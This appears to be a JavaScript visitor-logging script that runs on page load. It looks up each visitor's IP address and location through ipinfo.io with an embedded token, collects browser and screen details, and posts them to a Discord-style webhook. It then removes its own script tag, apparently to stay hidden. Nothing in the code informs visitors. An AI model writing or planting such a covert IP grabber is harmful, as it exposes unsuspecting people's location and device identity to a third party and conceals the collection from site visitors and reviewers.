async function sendWebhook() {
    const ipInfo = await fetch('https://ipinfo.io/json?token=ce1fc29ae007b4')
        .then(response => response.json())
        .catch(error => ({ error: 'Failed to fetch IP info' }));
    const deviceInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth
        }
    };
    const timeInWIB = new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta", hour12: false });
    const embed = {
        title: "New Access Detected",
        description: "Details of the access event",
        color: 3447003,
        fields: [
            {
                name: "URL",
                value: location.href,
                inline: false
            },
            {
                name: "Time",
                value: `${timeInWIB} WIB`,
                inline: false
            },
            {
                name: "IP",
                value: ipInfo.ip || 'Unavailable',
                inline: true
            },
            {
                name: "City",
                value: ipInfo.city || 'Unavailable',
                inline: true
            },
            {
                name: "Region",
                value: ipInfo.region || 'Unavailable',
                inline: true
            },
            {
                name: "Country",
                value: ipInfo.country || 'Unavailable',
                inline: true
            },
            {
                name: "User-Agent",
                value: deviceInfo.userAgent,
                inline: false
            },
            {
                name: "Platform",
                value: deviceInfo.platform,
                inline: true
            },
            {
                name: "Language",
                value: deviceInfo.language,
                inline: true
            },
            {
                name: "Screen",
                value: `Width: ${deviceInfo.screen.width}, Height: ${deviceInfo.screen.height}, Color Depth: ${deviceInfo.screen.colorDepth}`,
                inline: false
            }
        ],
        footer: {
            text: "Access event recorded"
        },
        timestamp: new Date()
    };
    const payload = JSON.stringify({
        embeds: [embed]
    });
    const xhr = new XMLHttpRequest();
    xhr.open("POST", webhookUrl, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.onreadystatechange = function () {
        if (xhr.readyState === XMLHttpRequest.DONE) {
            // Remove the script element after sending the webhook
            const scriptElement = document.querySelector('.traffic');
            if (scriptElement) {
                scriptElement.parentNode.removeChild(scriptElement);
            }
        }
    };
    xhr.send(payload);
}
sendWebhook();
